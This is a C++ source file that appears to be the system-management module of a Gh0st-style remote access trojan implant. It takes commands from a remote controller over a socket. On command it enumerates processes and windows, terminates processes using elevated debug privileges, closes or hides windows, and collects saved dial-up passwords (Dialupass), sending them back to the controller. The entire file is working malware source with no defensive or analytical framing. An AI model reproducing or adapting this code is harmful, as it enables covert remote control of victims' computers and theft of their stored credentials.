// SystemManager.cpp: implementation of the CSystemManager class.
//
//////////////////////////////////////////////////////////////////////

#include "../pch.h"
#include "SystemManager.h"
#include "Dialupass.h"
#include <tlhelp32.h>
#include <psapi.h>
#include <iphlpapi.h>
#pragma comment(lib,"Iphlpapi.lib")
#pragma comment(lib,"Psapi.lib")

#include "until.h"

//////////////////////////////////////////////////////////////////////
// Construction/Destruction
//////////////////////////////////////////////////////////////////////

CSystemManager::CSystemManager(CClientSocket *pClient, BOOL bHow) : CManager(pClient)
{
	m_bHow = bHow;
	if (m_bHow == COMMAND_SYSTEM)     //如果是获取进程
	{
		SendProcessList();
	}
	else if (m_bHow == COMMAND_WSLIST)   //如果是获取窗口
	{
		OutputDebugString("COMMAND_WSLIST");
		SendWindowsList();
	}
}

CSystemManager::~CSystemManager()
{

}
void CSystemManager::OnReceive(LPBYTE lpBuffer, UINT nSize)
{
	SwitchInputDesktop();
	switch (lpBuffer[0])
	{
	case COMMAND_PSLIST:
		SendProcessList();
		break;
	case COMMAND_WSLIST:
		SendWindowsList();
		break;
	case COMMAND_DIALUPASS:
		SendDialupassList();
		break;
	case COMMAND_KILLPROCESS:
		KillProcess((LPBYTE)lpBuffer + 1, nSize - 1);
		break;
	case COMMAND_WINDOW_CLOSE:
		CloseWindow(lpBuffer + 1);  //转到函数定义
		break;
	case COMMAND_WINDOW_TEST:    //最大化最小化 隐藏窗口都由这个函数处理
		TestWindow(lpBuffer + 1);    //转到定义
		break;
	default:
		break;
	}
}

void CSystemManager::SendProcessList()
{
	UINT	nRet = -1;
	DebugPrivilege(SE_SYSTEM_ENVIRONMENT_NAME, TRUE);
	LPBYTE	lpBuffer = getProcessList();
	DebugPrivilege(SE_SYSTEM_ENVIRONMENT_NAME, FALSE);
	if (lpBuffer == NULL)
		return;
	
	Send((LPBYTE)lpBuffer, LocalSize(lpBuffer));
	LocalFree(lpBuffer);
}

void CSystemManager::SendWindowsList()
{
	UINT	nRet = -1;
	DebugPrivilege(SE_SYSTEM_ENVIRONMENT_NAME, TRUE);
	LPBYTE	lpBuffer = getWindowsList();
	DebugPrivilege(SE_SYSTEM_ENVIRONMENT_NAME, FALSE);
	if (lpBuffer == NULL)
		return;


	Send((LPBYTE)lpBuffer, LocalSize(lpBuffer));
	LocalFree(lpBuffer);	
}

void CSystemManager::SendDialupassList()
{
	CDialupass	pass;

	int	nPacketLen = 0;
	for (int i = 0; i < pass.GetMax(); i++)
	{
		COneInfo	*pOneInfo = pass.GetOneInfo(i);
		for (int j = 0; j < STR_MAX; j++)
			nPacketLen += lstrlen(pOneInfo->Get(j)) + 1;
	}

	nPacketLen += 1;
	LPBYTE lpBuffer = (LPBYTE)LocalAlloc(LPTR, nPacketLen);
	
	DWORD	dwOffset = 1;
	int i = 0;
	for (i = 0; i < pass.GetMax(); i++)
	{

		COneInfo	*pOneInfo = pass.GetOneInfo(i);
		for (int j = 0; j < STR_MAX; j++)
		{
			int	nFieldLength = lstrlen(pOneInfo->Get(j)) + 1;
			memcpy(lpBuffer + dwOffset, pOneInfo->Get(j), nFieldLength);
			dwOffset += nFieldLength;
		}
	}

	lpBuffer[0] = TOKEN_DIALUPASS;
	Send((LPBYTE)lpBuffer, LocalSize(lpBuffer));
	LocalFree(lpBuffer);
	
}
void CSystemManager::KillProcess(LPBYTE lpBuffer, UINT nSize)
{
	HANDLE hProcess = NULL;
	DebugPrivilege(SE_DEBUG_NAME, TRUE);
	DWORD n = 0;
	for (int i = 0; i < nSize; i += 4)
	{
		n = *(LPDWORD)(lpBuffer + i);
		hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, *(LPDWORD)(lpBuffer + i));
		TerminateProcess(hProcess, 0);
		CloseHandle(hProcess);
	}
	DebugPrivilege(SE_DEBUG_NAME, FALSE);
	// 稍稍Sleep下，防止出错
	Sleep(100);
	// 刷新进程列表
	SendProcessList();
	// 刷新窗口列表
	//SendWindowsList();	
}

LPBYTE CSystemManager::getProcessList()
{
	HANDLE			hSnapshot = NULL;
	HANDLE			hProcess = NULL;
	HMODULE			hModules = NULL;
	PROCESSENTRY32	pe32 = {0};
	DWORD			cbNeeded;
	char			strProcessName[MAX_PATH] = {0};
	LPBYTE			lpBuffer = NULL;
	DWORD			dwOffset = 0;
	DWORD			dwLength = 0;
	DebugPrivilege(SE_DEBUG_NAME, TRUE);
	
	hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	
	if(hSnapshot == INVALID_HANDLE_VALUE)
		return NULL;
	
	pe32.dwSize = sizeof(PROCESSENTRY32);
	
	lpBuffer = (LPBYTE)LocalAlloc(LPTR, 1024);
	
	lpBuffer[0] = TOKEN_PSLIST;
	dwOffset = 1;
	
	if(Process32First(hSnapshot, &pe32))
	{	  
		do
		{      
			hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pe32.th32ProcessID);
			if ((pe32.th32ProcessID !=0 ) && (pe32.th32ProcessID != 4) && (pe32.th32ProcessID != 8))
			{
				EnumProcessModules(hProcess, &hModules, sizeof(hModules), &cbNeeded);
				GetModuleFileNameEx(hProcess, hModules, strProcessName, sizeof(strProcessName));
				
				// 此进程占用数据大小
				dwLength = sizeof(DWORD) + lstrlen(pe32.szExeFile) + lstrlen(strProcessName) + 2;
				// 缓冲区太小，再重新分配下
				if (LocalSize(lpBuffer) < (dwOffset + dwLength))
					lpBuffer = (LPBYTE)LocalReAlloc(lpBuffer, (dwOffset + dwLength), LMEM_ZEROINIT|LMEM_MOVEABLE);
				
				memcpy(lpBuffer + dwOffset, &(pe32.th32ProcessID), sizeof(DWORD));
				dwOffset += sizeof(DWORD);	
				
				memcpy(lpBuffer + dwOffset, pe32.szExeFile, lstrlen(pe32.szExeFile) + 1);
				dwOffset += lstrlen(pe32.szExeFile) + 1;
				
				memcpy(lpBuffer + dwOffset, strProcessName, lstrlen(strProcessName) + 1);
				dwOffset += lstrlen(strProcessName) + 1;
			}
		}
		while(Process32Next(hSnapshot, &pe32));
	}
	
	lpBuffer = (LPBYTE)LocalReAlloc(lpBuffer, dwOffset, LMEM_ZEROINIT|LMEM_MOVEABLE);
	
	DebugPrivilege(SE_DEBUG_NAME, FALSE); 
	CloseHandle(hSnapshot);
	return lpBuffer;	
}

bool CSystemManager::DebugPrivilege(const char *PName,BOOL bEnable)
{
	BOOL              bResult = TRUE;
	HANDLE            hToken;
	TOKEN_PRIVILEGES  TokenPrivileges;
	
	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY | TOKEN_ADJUST_PRIVILEGES, &hToken))
	{
		bResult = FALSE;
		return bResult;
	}
	TokenPrivileges.PrivilegeCount = 1;
	TokenPrivileges.Privileges[0].Attributes = bEnable ? SE_PRIVILEGE_ENABLED : 0;
	
	LookupPrivilegeValue(NULL, PName, &TokenPrivileges.Privileges[0].Luid);
	AdjustTokenPrivileges(hToken, FALSE, &TokenPrivileges, sizeof(TOKEN_PRIVILEGES), NULL, NULL);
    if (GetLastError() != ERROR_SUCCESS)
	{
		bResult = FALSE;
	}
	
	CloseHandle(hToken);
	return bResult;	
}

void CSystemManager::ShutdownWindows( DWORD dwReason )
{
	DebugPrivilege(SE_SHUTDOWN_NAME,TRUE);
	ExitWindowsEx(dwReason, 0);
	DebugPrivilege(SE_SHUTDOWN_NAME,FALSE);	
}

BOOL CALLBACK CSystemManager::EnumWindowsProc(HWND hwnd, LPARAM lParam)
{
	OutputDebugString("EnumWindowsProc");
	DWORD	dwLength = 0;
	DWORD	dwOffset = 0;
	DWORD	dwProcessID = 0;
	LPBYTE	lpBuffer = *(LPBYTE *)lParam;
	
	char	strTitle[1024];
	memset(strTitle, 0, sizeof(strTitle));
	::GetWindowText(hwnd, strTitle, sizeof(strTitle));
	   	
	//if (!IsWindowVisible(hwnd) || lstrlen(strTitle) == 0)strTitle[0] == '\0'
	if (lstrlen(strTitle) == 0)//!IsWindowVisible(hwnd) 在服务启动中会出错
	{
		return true;
	}
		OutputDebugString(strTitle);

		if (lpBuffer == NULL)
			lpBuffer = (LPBYTE)LocalAlloc(LPTR, 1);

		dwLength = sizeof(DWORD) + sizeof(DWORD) + lstrlen(strTitle) + 1;
		dwOffset = LocalSize(lpBuffer);

		lpBuffer = (LPBYTE)LocalReAlloc(lpBuffer, dwOffset + dwLength, LMEM_ZEROINIT | LMEM_MOVEABLE);


		memcpy((lpBuffer + dwOffset), &hwnd, sizeof(DWORD));
		dwOffset += sizeof(DWORD);
		GetWindowThreadProcessId(hwnd, (LPDWORD)(lpBuffer + dwOffset));
		dwOffset += sizeof(DWORD);
		memcpy(lpBuffer + dwOffset, strTitle, lstrlen(strTitle) + 1);
		//memcpy(lpBuffer + dwOffset + sizeof(DWORD), hwnd, sizeof(HWND) + 1);


		*(LPBYTE*)lParam = lpBuffer;		

	return true;
}

LPBYTE CSystemManager::getWindowsList()
{
	LPBYTE	lpBuffer = NULL;
	::EnumWindows((WNDENUMPROC)EnumWindowsProc, (LPARAM)&lpBuffer);
	lpBuffer[0] = TOKEN_WSLIST;
	return lpBuffer;	
}


void CSystemManager::CloseWindow(LPBYTE buf)
{
	// TODO: 在此处添加实现代码.
	DWORD hwnd;
	memcpy(&hwnd, buf, sizeof(DWORD));      //得到窗口句柄 
	::PostMessage((HWND__*)hwnd, WM_CLOSE, 0, 0); //向窗口发送关闭消息
	SendWindowsList();
}


void CSystemManager::TestWindow(LPBYTE buf)
{
	// TODO: 在此处添加实现代码.
	DWORD hwnd;
	DWORD dHow;
	memcpy((void*)&hwnd, buf, sizeof(DWORD));      //得到窗口句柄
	memcpy(&dHow, buf + sizeof(DWORD), sizeof(DWORD));     //得到窗口处理参数
	ShowWindow((HWND__*)hwnd, dHow);
}
